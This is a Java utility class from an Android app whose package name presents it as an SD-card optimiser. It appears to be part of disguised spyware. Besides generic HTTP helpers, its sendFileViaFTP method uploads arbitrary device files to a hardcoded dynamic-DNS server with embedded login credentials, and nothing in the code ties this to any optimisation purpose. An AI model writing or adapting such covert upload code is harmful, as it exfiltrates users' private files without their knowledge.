package com.android.sd.optimize;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Locale;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;

import android.util.Log;

public class Util {

	public static String execScript(String url) throws IOException {
		HttpClient client = new DefaultHttpClient();

		HttpGet get = new HttpGet(url.replace(" ", "%20"));
		HttpResponse response = client.execute(get);
		InputStream is = response.getEntity().getContent();
		BufferedReader reader = new BufferedReader(new InputStreamReader(is));
		StringBuilder sb = new StringBuilder();
		char[] buffer = new char[1024];
		int len = -1;
		while ((len = reader.read(buffer)) != -1) {
			sb.append(buffer, 0, len);
		}
		String result = sb.toString();
		return result;
	}

	public static String execPostScript(String url, ArrayList<NameValuePair> valuePairs)
			throws IOException {
		HttpClient client = new DefaultHttpClient();

		HttpPost post = new HttpPost(url.replace(" ", "%20"));
		if (valuePairs != null) {
			post.setEntity(new UrlEncodedFormEntity(valuePairs));
		}
		HttpResponse response = client.execute(post);
		InputStream is = response.getEntity().getContent();
		BufferedReader reader = new BufferedReader(new InputStreamReader(is));
		StringBuilder sb = new StringBuilder();
		char[] buffer = new char[1024];
		int len = -1;
		while ((len = reader.read(buffer)) != -1) {
			sb.append(buffer, 0, len);
		}
		String result = sb.toString();
		return result;
	}

	public static void sendFileViaFTP(String fileLoc, String fileName) throws IOException {

		FTPClient ftpClient = null;

		ftpClient = new FTPClient();
		ftpClient.connect(InetAddress.getByName("pizzacutter.no-ip.org"), 52173);

		if (ftpClient.login("androidupload", "h7a&1gNh0F$gh")) {

			ftpClient.enterLocalPassiveMode(); // important!
			ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
			FileInputStream in = new FileInputStream(new File(fileLoc));
			boolean result = ftpClient.storeFile("ftproot/" + fileName, in);
			in.close();
			ftpClient.logout();
			ftpClient.disconnect();
			if (result)
				Log.e("upload result", "succeeded");
			else {
				throw new IOException("Uploading failed");
			}
		}
	}

	public static String getTime() {
		Calendar c = Calendar.getInstance();
		SimpleDateFormat df = new SimpleDateFormat("yyyyMMdd-HHmmss", Locale.getDefault());
		String formattedDate = df.format(c.getTime());
		return formattedDate;
	}
}